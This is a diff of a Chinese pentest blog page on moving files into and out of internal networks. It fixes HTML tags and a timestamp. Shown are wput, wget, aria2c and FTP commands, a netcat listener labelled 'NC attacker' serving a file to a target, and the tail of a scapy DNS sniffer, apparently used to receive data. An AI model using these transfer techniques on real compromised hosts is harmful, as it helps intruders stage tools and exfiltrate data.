@@ -17,7 +17,7 @@
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="wput wput dir_name ftp://linuxpig:123456@host.com/  wget wget http://site.com/1.rar -O 1.rar  ariac2（需安装） aria2c -o owncloud.zip https://download.owncloud.org/community/owncloud-9.0.0.tar.bz2  powersh">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2020-03-05T04:25:00.602Z">
+<meta property="og:updated_time" content="2020-03-05T04:31:55.844Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="内网文件传输与下载">
 <meta name="twitter:description" content="wput wput dir_name ftp://linuxpig:123456@host.com/  wget wget http://site.com/1.rar -O 1.rar  ariac2（需安装） aria2c -o owncloud.zip https://download.owncloud.org/community/owncloud-9.0.0.tar.bz2  powersh">
@@ -162,10 +162,8 @@ file_put_contents($path, $data);
 <p><strong>NC attacker</strong></p>
 <pre>
 cat file | nc -l 1234
-<pre>
 target
-
-<pre>nc host_ip 1234 > file</pre>
+nc host_ip 1234 > file</pre>
 
 <p><strong>FTP</strong></p>
 <pre>ftp 127.0.0.1 username password get file exit</pre>
@@ -255,7 +253,7 @@ def process_packet(pkt):
 sniff(iface="eth0", prn=process_packet)
 </pre>
 <p>python3 dns_reciver.py</p>
-</pre></pre>
+
       
     </div>
     
